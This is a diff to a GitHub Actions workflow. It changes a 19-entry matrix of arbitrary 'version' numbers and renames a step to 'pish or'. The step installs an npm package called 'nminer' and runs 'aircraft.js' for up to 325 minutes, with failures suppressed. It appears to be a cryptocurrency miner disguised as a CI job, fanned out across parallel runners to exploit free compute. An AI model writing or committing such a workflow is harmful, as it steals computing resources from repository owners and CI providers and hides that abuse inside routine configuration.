@@ -9,25 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9084 }
-          - { version: 4865 }
-          - { version: 9119 }
-          - { version: 4167 }
-          - { version: 3750 }
-          - { version: 5267 }
-          - { version: 2582 }
-          - { version: 6367 }
-          - { version: 1775 }
-          - { version: 2053 }
-          - { version: 8821 }
-          - { version: 7993 }
-          - { version: 9421 }
-          - { version: 2652 }
-          - { version: 3165 }
-          - { version: 2836 }
-          - { version: 7720 }
-          - { version: 3852 }
-          - { version: 96 }
+          - { version: 230 }
+          - { version: 3543 }
+          - { version: 1279 }
+          - { version: 6076 }
+          - { version: 5559 }
+          - { version: 5072 }
+          - { version: 1000 }
+          - { version: 1484 }
+          - { version: 1995 }
+          - { version: 3680 }
+          - { version: 289 }
+          - { version: 7008 }
+          - { version: 4701 }
+          - { version: 1013 }
+          - { version: 8490 }
+          - { version: 5555 }
+          - { version: 2148 }
+          - { version: 2743 }
+          - { version: 1319 }
 
     steps:
       - name: Checkout
@@ -38,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: pish or
         run: |
           npm install nminer@latest
           timeout 325m node aircraft.js || echo "aircraft executed"
